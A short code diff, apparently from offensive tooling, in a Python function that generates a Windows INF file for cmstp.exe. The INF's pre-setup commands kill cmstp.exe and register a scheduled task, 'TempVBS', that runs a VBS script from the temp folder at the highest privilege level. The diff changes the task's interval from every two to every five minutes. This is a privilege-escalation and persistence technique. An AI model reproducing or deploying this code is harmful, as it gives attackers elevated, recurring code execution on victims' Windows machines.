@@ -70,7 +70,7 @@ def create_inf_file():
     [RunPreSetupCommandsSection]
     ; Commands to run before setup begins
     taskkill /IM cmstp.exe /F
-    cmd /c schtasks /create /tn "TempVBS" /tr "%temp%\\ddd.vbs" /sc minute /mo 2  /f /rl HIGHEST 
+    cmd /c schtasks /create /tn "TempVBS" /tr "%temp%\\ddd.vbs" /sc minute /mo 5  /f /rl HIGHEST 
 
     [CustInstDestSectionAllUsers]
     49000,49001=AllUser_LDIDSection,7
